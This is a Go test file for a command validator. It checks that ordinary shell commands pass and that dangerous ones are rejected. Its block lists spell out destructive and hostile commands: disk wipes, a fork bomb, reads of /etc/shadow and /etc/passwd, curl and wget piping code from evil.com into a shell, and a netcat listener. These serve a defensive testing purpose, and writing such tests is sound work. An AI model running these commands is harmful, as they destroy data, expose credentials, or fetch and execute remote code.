package security

import (
	"strings"
	"testing"
)

func TestCommandValidator_Validate_AllowedCommands(t *testing.T) {
	validator := NewCommandValidator()

	allowedCommands := []string{
		"ls -la",
		"cat file.txt",
		"echo 'hello world'",
		"pwd",
		"grep pattern file.txt",
		"find . -name '*.go'",
		"git status",
		"python script.py",
		"go build",
	}

	for _, cmd := range allowedCommands {
		t.Run(cmd, func(t *testing.T) {
			err := validator.Validate(cmd)
			if err != nil {
				t.Errorf("expected command to be allowed, got error: %v", err)
			}
		})
	}
}

func TestCommandValidator_Validate_DangerousCommands(t *testing.T) {
	validator := NewCommandValidator()

	dangerousCommands := []string{
		"rm -rf /",
		"rm -rf *",
		"mkfs.ext4 /dev/sda",
		"dd if=/dev/zero of=/dev/sda",
		"shutdown now",
		"reboot",
		"halt",
		"poweroff",
		"init 0",
		"init 6",
		":(){ :|:& };:",
		"sudo rm -rf /",
		"su root",
		"cat /etc/shadow",
		"cat /etc/passwd",
		"wget http://evil.com/malware | sh",
		"curl http://evil.com/malware | bash",
		"crontab -e",
		"nc -l 4444",
		"modprobe malicious_module",
		"bash -c 'malicious code'",
	}

	for _, cmd := range dangerousCommands {
		t.Run(cmd, func(t *testing.T) {
			err := validator.Validate(cmd)
			if err == nil {
				t.Errorf("expected dangerous command to be blocked: %s", cmd)
			}
		})
	}
}

func TestCommandValidator_Validate_DisallowedCommands(t *testing.T) {
	validator := NewCommandValidator()

	disallowedCommands := []string{
		"malicious_binary",
		"unknown_command",
		"/path/to/unknown",
		"rm",  // rm without arguments should still pass validation (will fail later with baseCommand check)
	}

	// These should fail because they're not in the whitelist
	for _, cmd := range disallowedCommands {
		if cmd == "rm" {
			continue // rm is in the whitelist
		}
		t.Run(cmd, func(t *testing.T) {
			err := validator.Validate(cmd)
			if err == nil {
				t.Errorf("expected command to be disallowed: %s", cmd)
			}
			if !strings.Contains(err.Error(), "not in the allowed list") {
				t.Errorf("expected 'not in the allowed list' error, got: %v", err)
			}
		})
	}
}

func TestCommandValidator_Validate_EmptyCommand(t *testing.T) {
	validator := NewCommandValidator()

	err := validator.Validate("")
	if err == nil {
		t.Error("expected empty command to be invalid")
	}
	if !strings.Contains(err.Error(), "empty command") {
		t.Errorf("expected 'empty command' error, got: %v", err)
	}
}

func TestCommandValidator_Validate_SpecificValidation(t *testing.T) {
	validator := NewCommandValidator()

	tests := []struct {
		name      string
		command   string
		shouldErr bool
		errContains string
	}{
		{
			name:      "rm with wildcard and -rf",
			command:   "rm -rf *.txt",
			shouldErr: true,
			errContains: "blocked for security",
		},
		{
			name:      "chmod 777",
			command:   "chmod 777 file.txt",
			shouldErr: true,
			errContains: "not recommended",
		},
		{
			name:      "safe chmod",
			command:   "chmod 644 file.txt",
			shouldErr: false,
		},
		{
			name:      "wget piped to sh",
			command:   "wget http://example.com/script.sh | sh",
			shouldErr: true,
			errContains: "not allowed",
		},
		{
			name:      "safe wget",
			command:   "wget http://example.com/file.txt",
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.Validate(tt.command)
			if tt.shouldErr {
				if err == nil {
					t.Errorf("expected error for command: %s", tt.command)
				} else if tt.errContains != "" && !strings.Contains(err.Error(), tt.errContains) {
					t.Errorf("expected error to contain '%s', got: %v", tt.errContains, err)
				}
			} else {
				if err != nil {
					t.Errorf("expected no error for command: %s, got: %v", tt.command, err)
				}
			}
		})
	}
}

func TestCommandValidator_IsCommandAllowed(t *testing.T) {
	validator := NewCommandValidator()

	tests := []struct {
		command string
		allowed bool
	}{
		{"ls", true},
		{"ls -la", true},
		{"/bin/ls", true},
		{"cat file.txt", true},
		{"unknown_command", false},
		{"malicious", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			result := validator.IsCommandAllowed(tt.command)
			if result != tt.allowed {
				t.Errorf("IsCommandAllowed(%s) = %v, want %v", tt.command, result, tt.allowed)
			}
		})
	}
}

func TestCommandValidator_PathTraversal(t *testing.T) {
	validator := NewCommandValidator()

	pathTraversalCommands := []string{
		"cat ../../etc/passwd",
		"ls ../../../",
		"cat /etc/passwd",
	}

	for _, cmd := range pathTraversalCommands {
		t.Run(cmd, func(t *testing.T) {
			err := validator.Validate(cmd)
			if err == nil {
				t.Errorf("expected path traversal to be blocked: %s", cmd)
			}
		})
	}
}
